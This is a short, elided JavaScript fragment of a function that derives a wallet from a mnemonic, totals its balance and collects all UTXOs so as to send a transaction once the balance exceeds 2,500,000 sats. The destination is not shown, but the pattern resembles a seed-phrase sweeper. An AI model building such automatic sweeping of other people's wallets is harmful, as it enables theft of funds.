...
const generateWallet = async (mnemonic) => {
    ...
    // Check if the total balance is greater than 2,500,000 sats and send transaction if it is
    const totalBalance = Object.values(results).reduce((acc, { totalBalance }) => acc + totalBalance, 0);
    const allUtxos = Object.values(results).flatMap(({ usedAddresses }) => usedAddresses.flatMap(addr => addr.utxos));
